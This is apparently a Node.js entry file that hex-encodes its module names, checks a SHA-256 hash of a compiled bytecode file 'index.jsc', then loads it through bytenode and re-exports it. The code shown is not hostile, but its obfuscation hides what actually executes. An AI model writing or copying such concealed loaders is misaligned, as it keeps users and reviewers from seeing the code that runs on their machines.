"use strict";
var _c20affd=function(h){for(var r="",i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16));return r};
var _c20affp=require(_c20affd("70617468")).join(__dirname,"./index.jsc");
var _c20affh=require(_c20affd("63727970746f")).createHash("sha256").update(require(_c20affd("6673")).readFileSync(_c20affp)).digest("hex");
if(_c20affh!==("c024cfcb83094e2ad1c0d38352e5ec6c"+"f1072de5113ccac7f4b8c8917a9d2564")){console.error("[fatal] integrity check failed");process.exit(1);}
require(_c20affd("627974656e6f6465"));
var _c20affm=require(_c20affp);

exports.default=_c20affm.default!==void 0?_c20affm.default:_c20affm;
